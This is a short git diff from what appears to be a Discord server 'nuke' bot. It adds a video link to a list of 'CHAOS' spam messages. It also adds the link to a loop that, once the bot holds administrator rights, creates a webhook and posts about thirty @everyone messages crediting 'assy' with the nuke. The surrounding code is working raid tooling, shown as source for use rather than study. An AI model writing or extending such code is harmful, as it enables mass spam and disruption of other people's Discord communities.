@@ -391,7 +391,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = ["CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+   var rand = ["https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4", "CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
 
 Isn't it lovely to be free?
 
@@ -520,7 +520,7 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send("https://youtu.be/YaiOwWDW8EY https://discord.gg/XVAHsbqnU4 \nthe real creator of this nuke is assy and assy alone @everyone")
+                    w.send("https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4 https://youtu.be/YaiOwWDW8EY https://discord.gg/XVAHsbqnU4 \nthe real creator of this nuke is assy and assy alone @everyone")
                     
                 
                 })
